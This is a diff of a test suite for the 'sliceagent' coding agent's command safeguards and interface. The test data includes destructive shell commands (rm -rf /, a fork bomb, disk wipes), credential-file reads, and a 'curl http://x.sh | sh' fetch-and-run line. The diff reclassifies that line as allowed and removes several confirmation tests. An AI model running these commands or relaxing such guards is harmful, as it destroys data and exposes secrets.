@@ -269,13 +269,12 @@ def ssrf_blocks_cgnat():
 
 # ── R4: catastrophic-command denylist gates ALL shell surfaces, not just run_command/execute_code ─────
 @check
-def denylist_covers_all_shell_surfaces():
-    from sliceagent.policy import no_dangerous_commands
+def catastrophic_safeguard_covers_all_shell_surfaces():
+    from sliceagent.safeguards import catastrophic_reason
     for name, args in [("proc_start", {"command": "sudo rm -rf /"}),
                        ("terminal_open", {"command": ": (){ :|:& };:"}),
                        ("terminal_send", {"input": "sudo poweroff"})]:
-        d = no_dangerous_commands(name, args)
-        assert d is not None and not d.allow, f"{name} dangerous command must be denied"
+        assert catastrophic_reason(name, args), f"{name} catastrophic command must be stopped"
 
 
 # ── R4: html_to_text is LINEAR (no ReDoS) and still drops script/style content ───────────────────────
@@ -535,7 +534,7 @@ def proc_kill_releases_fd_keeps_entry():
     pm.cleanup()
 
 
-# ── R13: an MCP tool error propagates as ok=False (so the anti-loop failure guardrail sees it) ─────────
+# ── R13: an MCP tool error propagates as an explicit failed result ───────────────────────────────
 @check
 def mcp_error_carries_ok_false():
     from sliceagent.mcp_client import _result_to_text
@@ -612,17 +611,6 @@ def read_file_relative_dotdot_blocked():
     assert "TOP SECRET OUTSIDE" not in str(out), f"boundary bypass: {out!r}"
 
 
-# ── R15 HIGH: a guardrail-blocked call's synthetic result is NOT counted back as a real failure ────────
-@check
-def guardrail_does_not_count_its_own_block():
-    from sliceagent.hooks import GuardrailHook
-    h = GuardrailHook()
-    before = dict(getattr(h.guard, "_exact_failure_counts", {}) or {})
-    h.transform_tool_result("edit_file", {"path": "x"}, "Error: blocked by policy: loop blocked")
-    after = dict(getattr(h.guard, "_exact_failure_counts", {}) or {})
-    assert before == after, "a guardrail block must not advance the failure counters"
-
-
 # ── R15 MED: a grep with a DIRECTORY path arg is not pinned into the working set (phantom file) ────────
 @check
 def grep_dir_path_not_pinned():
@@ -687,26 +675,15 @@ def rate_limit_not_context_overflow():
     assert not is_context_overflow(Exception("Rate limit reached for tokens. Limit: 30000 input tokens per minute."))
 
 
-# ── R17 MED: result_no_progress blocks command repeats but NEVER the edit/ask escape ──────────────────
-@check
-def result_no_progress_lets_edit_escape():
-    from sliceagent.guardrails import ToolCallGuardrail
-    g = ToolCallGuardrail()
-    out = "Build succeeded"
-    for _ in range(5):
-        g.after_call("run_command", {"command": "make"}, out)
-    assert g.before_call("run_command", {"command": "make again"}).block is True   # command repeat still caught
-    assert g.before_call("edit_file", {"path": "x"}).block is False                # the edit escape is NOT blocked
-    assert g.before_call("ask_user", {"question": "?"}).block is False             # nor ask_user
-
-
+# ── Simplified guard: repeated successful output never locks another action ───────────────────────────
 # ── R17 MED: a split/long-form recursive rm of / is still denied ──────────────────────────────────────
 @check
 def split_recursive_rm_root_denied():
-    from sliceagent.policy import no_dangerous_commands
+    from sliceagent.safeguards import catastrophic_reason
     for cmd in ("rm -r -f /", "rm --recursive /", "rm -fr /"):
-        assert no_dangerous_commands("run_command", {"command": cmd}) is not None, f"{cmd!r} must be denied"
-    assert no_dangerous_commands("run_command", {"command": "rm -rf ./build"}) is None, "workspace-relative rm stays allowed"
+        assert catastrophic_reason("run_command", {"command": cmd}), f"{cmd!r} must be stopped"
+    assert catastrophic_reason("run_command", {"command": "rm -rf ./build"}) is None, \
+        "workspace-relative cleanup stays allowed"
 
 
 # ── R18 HIGH: a world-model value containing "Authorization: Bearer <tok>" survives checkpoint redaction ─
@@ -729,17 +706,7 @@ def _write_tmp(md):
     return p
 
 
-# ── R18 MED: the call_budget floor never blocks the edit/ask escape (mirrors result_no_progress) ───────
-@check
-def call_budget_lets_edit_escape():
-    from sliceagent.guardrails import ToolCallGuardrail
-    g = ToolCallGuardrail()
-    for i in range(25):                                   # spree of distinct failing reads → trips the floor
-        g.after_call("read_file", {"path": f"f{i}.py"}, "Error: boom")
-    assert g.before_call("edit_file", {"path": "x"}).block is False, "edit must escape the call_budget floor"
-    assert g.before_call("ask_user", {"question": "?"}).block is False
-
-
+# ── Distinct failures never create a global lock on edit/ask actions ──────────────────────────────────
 # ── R18 MED: episode meta['files'] = only SUCCESSFUL edits (reads + failed edits excluded) ─────────────
 @check
 def episode_files_only_real_edits():
@@ -794,10 +761,11 @@ def slash_command_menu_renders():
     import sliceagent.tui as t
     from prompt_toolkit.document import Document
     cmds = [c.text for c in t._InputCompleter().get_completions(Document("/"), None)]
-    assert {"/model", "/mode", "/cost", "/learn", "/update", "/plugins", "/mcp"} <= set(cmds), cmds
+    assert {"/model", "/cost", "/learn", "/update", "/plugins", "/mcp", "/resume",
+            "/skills", "/tools", "/agents"} <= set(cmds), cmds
     # trimmed from the palette per the menu redesign (undo is now Esc; reasoning folded into /model):
-    assert not ({"/reasoning", "/switch", "/resume", "/undo"} & set(cmds)), cmds
-    assert set(c.text for c in t._InputCompleter().get_completions(Document("/mod"), None)) == {"/model", "/mode"}
+    assert not ({"/reasoning", "/switch", "/undo"} & set(cmds)), cmds
+    assert [c.text for c in t._InputCompleter().get_completions(Document("/mod"), None)] == ["/model"]
     assert [c.text for c in t._InputCompleter().get_completions(Document("/le"), None)] == ["/learn"]
     from prompt_toolkit.input.defaults import create_pipe_input
     from prompt_toolkit.output import DummyOutput
@@ -806,6 +774,57 @@ def slash_command_menu_renders():
         app, _ = t.TuiInput({"model": "x"}, root=".")._build_composer(pt_input=pin, pt_output=DummyOutput())
         assert any(isinstance(f.content, MultiColumnCompletionsMenu) for f in app.layout.container.floats), \
             "composer has no completions-menu float → '/' computes matches but draws nothing"
+
+
+@check
+def slash_catalog_help_docs_and_discovery_are_consistent():
+    import pathlib
+    import sliceagent.tui as t
+    from sliceagent.cli import (_discovery_agent_lines, _discovery_skill_lines,
+                                _discovery_tool_lines)
+    from sliceagent.slash import (HIDDEN_SLASH_ALIASES, PUBLIC_SLASH_COMMANDS,
+                                  SUPPORTED_SLASH_COMMANDS, slash_help_line)
+
+    assert t._SLASH is PUBLIC_SLASH_COMMANDS
+    assert set(t._SLASH) == set(PUBLIC_SLASH_COMMANDS)
+    assert SUPPORTED_SLASH_COMMANDS == set(PUBLIC_SLASH_COMMANDS) | set(HIDDEN_SLASH_ALIASES)
+    assert set(HIDDEN_SLASH_ALIASES) == {"/reasoning", "/undo", "/switch"}
+    help_line = slash_help_line()
+    assert all(command in help_line for command in PUBLIC_SLASH_COMMANDS)
+
+    readme = pathlib.Path(__file__).parents[1].joinpath("README.md").read_text(encoding="utf-8")
+    public_line = next(line for line in readme.splitlines() if line.startswith("Public `/` palette:"))
+    documented = set(__import__("re").findall(r"`(/[-a-z]+)`", public_line))
+    assert documented == set(PUBLIC_SLASH_COMMANDS), (documented, set(PUBLIC_SLASH_COMMANDS))
+
+    class Skills:
+        def catalog(self):
+            return [("review", "Inspect code"), ("ship", "Build safely")]
+
+    class Entry:
+        def __init__(self, source): self.source = source
+
+    class Registry:
+        def entry(self, name): return Entry("builtin") if name == "read_file" else None
+
+    class Spec:
+        description = "Read the workspace"
+        read_only = True
+
+    class Tools:
+        core_mode = True
+        agents = {"explorer": Spec(), "general": Spec()}
+
+        def schemas(self):
+            return [{"function": {"name": "read_file"}}, {"function": {"name": "spawn_agent"}}]
+
+    assert any("review — Inspect code" in line for line in _discovery_skill_lines(Skills()))
+    tool_lines = _discovery_tool_lines(Tools(), Registry())
+    assert any("builtin: read_file" in line for line in tool_lines)
+    assert any("subagent: spawn_agent" in line for line in tool_lines)
+    agent_lines = _discovery_agent_lines(Tools())
+    assert any("explorer [read-only]" in line for line in agent_lines)
+    assert not any("general" in line for line in agent_lines), agent_lines
 
 
 # ── FEATURE: two-tier selector menus (model→reasoning, mode) ───────────────────────────────────────────
@@ -850,28 +869,6 @@ def model_menu_is_provider_aware():
     assert fams == sorted(fams)                                   # grouped (sorted) by provider family
 
 
-# ── FEATURE: three permission modes, all sharing the catastrophic floor ───────────────────────────────
-@check
-def policy_three_modes():
-    from sliceagent.policy import make_policy, resolve_policy_mode
-
-    def verdict(p, name, args):
-        d = p(name, args)
-        return "ask" if (d and d.ask) else ("deny" if (d and not d.allow) else "auto")
-
-    baby, teen, letgo = make_policy("baby-sitter"), make_policy("teenager"), make_policy("let-it-go")
-    # baby-sitter confirms everything; teenager auto-edits but confirms commands; let-it-go auto-runs both
-    assert verdict(baby, "edit_file", {"path": "a"}) == "ask"
-    assert verdict(teen, "edit_file", {"path": "a"}) == "auto"
-    assert verdict(teen, "run_command", {"command": "pytest"}) == "ask"
-    assert verdict(letgo, "run_command", {"command": "pytest"}) == "auto"
-    # ALL THREE block catastrophic moves (the shared floor)
-    for p in (baby, teen, letgo):
-        assert verdict(p, "run_command", {"command": "rm -rf /"}) == "deny"
-    # legacy names still resolve (back-compat)
-    assert resolve_policy_mode("guard") == "letitgo" and resolve_policy_mode("ask") == "babysitter"
-
-
 # ── FEATURE (item D): a chitchat fast-path detector — high precision, never fires on a real request ────
 @check
 def chitchat_detector_high_precision():
@@ -883,17 +880,6 @@ def chitchat_detector_high_precision():
     for t in ["fix the bug in auth.py", "what does foo() do?", "explain the slice loop",
               "hi, can you read config.py", "add a test", "thanks, now refactor X", "", "ok do it"]:
         assert not is_chitchat(t), f"must NOT be chitchat (real request): {t!r}"
-
-
-# ── FEATURE: legacy policy names warn LOUDLY (guard can't silently downgrade safety to let-it-go) ──────
-@check
-def legacy_policy_names_warn_loudly():
-    from sliceagent.policy import legacy_warning
-    assert "let-it-go" in legacy_warning("guard"), "guard must warn it now means let-it-go (auto)"
-    assert legacy_warning("ask") and legacy_warning("allow") and legacy_warning("readonly")
-    assert legacy_warning("GUARD") and legacy_warning(" guard ")          # case/space tolerant
-    for friendly in ("baby-sitter", "teenager", "let-it-go"):             # current names: NO warning
-        assert legacy_warning(friendly) is None, friendly
 
 
 # ── FEATURE: no proxy by default (direct for every endpoint); an explicit setting wins ───
@@ -962,10 +948,11 @@ def cost_chart_renders_flat_vs_rising():
 def model_pricing_is_single_source():
     from sliceagent import model_catalog as mc
     from sliceagent import tui
-    assert mc.pricing("gpt-5.5")[0] == 1.25 and mc.pricing("deepseek-chat")[2] == 1.10
+    assert mc.pricing("gpt-5.5")[0] == 1.25 and mc.pricing("deepseek-chat")[2] == 0.28
+    assert mc.pricing("deepseek-v4-pro") == (0.435, 0.003625, 0.87)
     assert mc.pricing("kimi-k2-0905-preview")[1] == 0.15 and mc.pricing("claude-sonnet-4-6")[0] == 3.0
     assert mc.pricing("totally-unknown-model") is None
-    assert mc.pricing("custom", "https://api.deepseek.com")[0] == 0.27   # base_url disambiguation
+    assert mc.pricing("custom", "https://api.deepseek.com")[0] == 0.14   # base_url disambiguation
     assert tui._price("gpt-5.5") == mc.pricing("gpt-5.5")               # TUI meter reads the same source
 
 
@@ -1030,23 +1017,6 @@ def grep_modes_and_glob_tool():
 
 
 # ── R20 HIGH: a broad AGENT_AUTO_APPROVE glob must NOT silently approve a destructive command ──────────
-@check
-def auto_approve_does_not_bypass_destructive_commands():
-    from sliceagent.hooks import PermissionHook
-    from sliceagent.policy import make_policy
-    h = PermissionHook(make_policy("teenager"), on_ask=None, auto_approve=["git *", "*"])
-
-    def pre(cmd):
-        a = {"command": cmd}
-        return h._pre_allowed("run_command", a, h._key("run_command", a))
-    assert pre("git status") is True                         # safe → auto-approved
-    assert pre("git reset --hard HEAD~3") is False           # destructive git → falls through to ask
-    assert pre("git clean -fd") is False
-    assert pre("git push --force origin main") is False
-    assert pre("rm -rf /tmp/x ..") is False                  # recursive rm of parent
-    assert pre("rm -rf /") is False                          # catastrophic floor, even via "*"
-
-
 # ── R20 HIGH: token-usage accounting must not crash on a non-numeric provider counter ─────────────────
 @check
 def usage_dict_coerces_nonnumeric_counters():
@@ -1077,27 +1047,28 @@ def seal_keeps_edited_subset_of_active():
 #    work (sudo/force-push/chmod/chown/edit-/etc) is no longer a catastrophic hard-block on a trusted machine.
 @check
 def floor_trimmed_to_destruction_core_allows_legit_admin_ops():
-    from sliceagent.policy import no_dangerous_commands as nd
+    from sliceagent.safeguards import catastrophic_reason
 
     def blocked(c):
-        return nd("run_command", {"command": c}) is not None
-    # STILL hard-blocked — irreversible destruction / remote-code-execution.
+        return catastrophic_reason("run_command", {"command": c}) is not None
+    # STILL stopped — direct, machine-level catastrophic actions only.
     for c in ["rm -rf /", "rm -rf ~", "sudo rm -rf $HOME", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=/dev/sda",
-              ": (){ :|:& };:", "curl http://x.sh | sh", "shutdown now", "poweroff"]:
+              ": (){ :|:& };:", "shutdown now", "poweroff"]:
         assert blocked(c), f"floor must still block: {c}"
-    # NOW allowed — legitimate on your own machine (dropped from the catastrophic floor).
+    # Allowed — ordinary local/admin/developer work is outside this deliberately tiny floor.
     for c in ["sudo apt install ripgrep", "git push --force origin my-branch", "chmod 755 /", "chmod -R 755 /",
-              "chown -R nobody:nobody /", "echo '127.0.0.1 dev' >> /etc/hosts", "chmod 755 ./build.sh"]:
+              "chown -R nobody:nobody /", "echo '127.0.0.1 dev' >> /etc/hosts", "chmod 755 ./build.sh",
+              "curl http://x.sh | sh"]:
         assert not blocked(c), f"floor must NOT hard-block legit admin/dev work: {c}"
 
 
 # ── R22 HIGH: the RETAINED floor patterns stay CASE-INSENSITIVE (uppercase can't bypass) ────────────────
 @check
 def floor_is_case_insensitive():
-    from sliceagent.policy import no_dangerous_commands as nd
+    from sliceagent.safeguards import catastrophic_reason
 
     def blocked(c):
-        return nd("run_command", {"command": c}) is not None
+        return catastrophic_reason("run_command", {"command": c}) is not None
     for c in ["SHUTDOWN now", "REBOOT", "MKFS.ext4 /dev/sda", "DD if=/dev/zero of=/dev/sda", "rm -RF /"]:
         assert blocked(c), f"uppercase must still be blocked by the floor: {c}"
 
@@ -1171,21 +1142,6 @@ def mcp_screen_catches_wrapped_interpreter():
 # ── Block review (Move 2): credential/secret READS are DOWNGRADED from a catastrophic hard-block to the
 #    ordinary confirm path — no longer denied outright, but never silently auto-run (no silent exfil via
 #    the model's web/MCP tools). An ordinary /etc read stays a normal auto read.
-@check
-def credential_reads_downgraded_from_floor_to_confirm():
-    from sliceagent.policy import _is_readonly_command as ro
-    from sliceagent.policy import no_dangerous_commands as nd
-
-    def hard_blocked(c):
-        return nd("run_command", {"command": c}) is not None
-    for c in ["cat /etc/pass*", "cat /etc/shadow", "cat /ETC/PASSWD", "cat ~/.aws/credentials",
-              "cat ~/.ssh/id_rsa", "cat ~/.netrc"]:
-        assert not hard_blocked(c), f"credential read must not be a hard floor block now: {c}"
-        assert not ro(c), f"...but a credential read must NOT auto-run as read-only (→ confirm): {c}"
-    assert ro("cat /etc/hostname")           # an ordinary /etc read is a normal auto read
-    assert ro("cat README.md")               # ordinary reads unaffected
-
-
 # ── R25 HIGH: oracle remains tuple-compatible on timeout-with-output ─────────────────────────────
 @check
 def oracle_timeout_with_output_no_crash():
@@ -1233,22 +1189,6 @@ def seal_keeps_pre_defs_for_edited_files():
 
 # ── convo-audit fixes (2026-07-01): read-only command allowlist + repo-content gate + map bound ──
 @check
-def teenager_auto_allows_readonly_shell_but_confirms_writes():
-    from sliceagent.policy import ask_commands
-    ro = ["git rev-parse --show-toplevel", "git status", "ls -la", "pwd", "cat README.md",
-          "find . -name '*.py'", "grep -rn foo src"]
-    for c in ro:
-        assert ask_commands("run_command", {"command": c}) is None, f"read-only should auto-allow: {c}"
-    asks = ["rm -rf build", "git push", "git commit -m x", "python setup.py", "echo hi > f",
-            "cat a && rm b", "git branch -d main", "find . -delete", "git config user.x y"]
-    for c in asks:
-        d = ask_commands("run_command", {"command": c})
-        assert d is not None and d.ask, f"non-read-only should still confirm: {c}"
-    # execute_code (arbitrary python) is never auto-allowed by the shell allowlist
-    assert ask_commands("execute_code", {"code": "print(1)"}).ask, "execute_code must still confirm"
-
-
-@check
 def repo_map_is_char_bounded():
     from sliceagent.sensory_cortex import repo_map
     with tempfile.TemporaryDirectory() as d:
@@ -1269,34 +1209,6 @@ def project_root_none_outside_a_project():
         assert project_root(d) is None, "a bare non-project dir has no project root (→ no repo map)"
         os.makedirs(os.path.join(d, ".git"))
         assert project_root(d) == os.path.realpath(d), "a git root IS a project root"
-
-
-@check
-def confirm_maps_arrow_selection_to_verdict():
-    import io
-    from rich.console import Console
-    from sliceagent import tui
-    c = Console(file=io.StringIO())
-    orig = tui._arrow_select
-    try:
-        for i, expect in [(0, "yes"), (1, "no"), (2, "always"), (-1, "no")]:
-            tui._arrow_select = lambda opts, default=0, _i=i: _i
-            got = tui.confirm(c, "run_command", "ls", "reason")
-            assert got == expect, f"selection idx {i} should map to {expect!r}, got {got!r}"
-    finally:
-        tui._arrow_select = orig
-
-
-@check
-def confirm_fallback_prompt_brackets_survive_rich_markup():
-    # the rendered bug: console.input("[y]es...") → Rich parses [y] as a style tag → "es / o / lways".
-    # the fix escapes them (\[y]); pin that the literal brackets survive a Rich render.
-    import io
-    from rich.console import Console
-    c = Console(file=io.StringIO(), force_terminal=False)
-    c.print(r"\[y]es / \[n]o / \[a]lways")
-    out = c.file.getvalue()
-    assert "[y]es" in out and "[n]o" in out and "[a]lways" in out, f"brackets eaten by markup: {out!r}"
 
 
 @check
@@ -1450,6 +1362,10 @@ def slash_handlers_print_bracketed_paths_without_markup_crash():
         raised = True
     assert raised, "sanity: '[/]' DOES break Rich with markup on (so markup=False is load-bearing)"
 
+    from sliceagent.cli import _rich_escape
+    con.print(f"configured [bold]{_rich_escape('provider[/]prod')}[/]")
+    con.print(f"model [bold]{_rich_escape('model[next]')}[/]")
+
 
 @check
 def as_text_coerces_none_and_bytes():
@@ -1458,6 +1374,45 @@ def as_text_coerces_none_and_bytes():
     assert _as_text(b"hi") == "hi", "bytes must decode, not become the b'…' repr"
     assert _as_text(bytearray(b"ok")) == "ok"
     assert _as_text("plain") == "plain" and _as_text(42) == "42"
+
+
+# ── a parked internal error keeps its CAUSE: TurnInterrupted → last_error → child seal (was: the child
+#    artifact recorded the literal string "error"; the exception type+message were lost everywhere) ────────
+@check
+def parked_internal_error_cause_survives_into_last_error():
+    from sliceagent.events import TurnInterrupted
+    from sliceagent.loop import run_turn
+    from sliceagent.pfc import Slice, slice_sink
+    from sliceagent.tools import LocalToolHost
+
+    class _ExplodingLLM:
+        def complete(self, _messages, _schemas):
+            raise RuntimeError("simulated provider failure mid-turn")
+
+    s = Slice(); s.reset("bug hunt")
+    sink = slice_sink(s)
+    events = []
+    with tempfile.TemporaryDirectory(prefix="park-cause-") as root:
+        host = LocalToolHost(root)
+        try:
+            result = run_turn(
+                build_slice=lambda: [{"role": "user", "content": "find bugs"}],
+                llm=_ExplodingLLM(), tools=host,
+                dispatch=lambda e: (events.append(e), sink(e)),
+                max_steps=5,
+            )
+        finally:
+            host.cleanup()
+    assert result.stop_reason == "error", result
+    interrupted = [e for e in events if isinstance(e, TurnInterrupted)]
+    assert interrupted and "RuntimeError: simulated provider failure" in (interrupted[0].message or ""), \
+        "the park message must carry the exception type AND message"
+    assert "RuntimeError: simulated provider failure" in s.last_error, \
+        f"the sink must persist the cause into last_error (child seals read it): {s.last_error!r}"
+    # a user abort stays clean: no error blob planted for a ctrl-C
+    s2 = Slice(); s2.reset("t")
+    slice_sink(s2)(TurnInterrupted("aborted", message=None))
+    assert not s2.last_error
 
 
 def main():
